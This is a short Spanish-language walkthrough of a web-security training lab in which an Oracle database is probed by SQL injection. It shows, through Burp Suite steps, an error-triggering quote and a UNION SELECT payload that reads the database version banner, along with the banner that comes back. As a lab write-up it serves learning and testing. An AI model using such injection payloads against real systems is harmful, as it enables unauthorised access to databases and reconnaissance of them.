@@ -1,0 +1,40 @@
+
+
+EXAMINING THE DATA BASE
+
+
+
+
+			--> Lab: SQL injection attack, querying the database type and version on Oracle
+
+-> Reconocimiento & Objectivo :
+
+Vulnerabilidad en el "product category filter"
+Se puede usar el UNION attack para explotar la vulnerabilidad
+End gol: Saber la version de la base de datos que se esta usando. 
+
+
+-> Analisis de la maquina: 
+
+1) con burpsuite y fox proxy, vamos a la URL: https://0a78008804a222f980b3807400a300e0.web-security-academy.net/filter?category=Pets
+
+2) capturamos el trafico que esta en burp suite > proxy > HTTP history, en la URL con el parametro "category" lo mandamos al "repeater" de burp suite. 
+
+3) En repeater modificamos los valores del parametro de "category" a: ' . Esto nos devuelve un error 500, mostrando que la pagina es vulnerable a SQL injection 
+
+4) Siempre en category, cambiar el valor por los siguientes strings (nuestro payload) para ver cual funciona: 
+
+'+UNION+SELECT+banner,+NULL+FROM+v$version--
+
+Desde la URL: https://0a78008804a222f980b3807400a300e0.web-security-academy.net/filter?category=Pets+%27+UNION+SELECT+banner,+NULL+FROM+v$version-- 
+
+
+=> Output: 
+
+CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
+
+
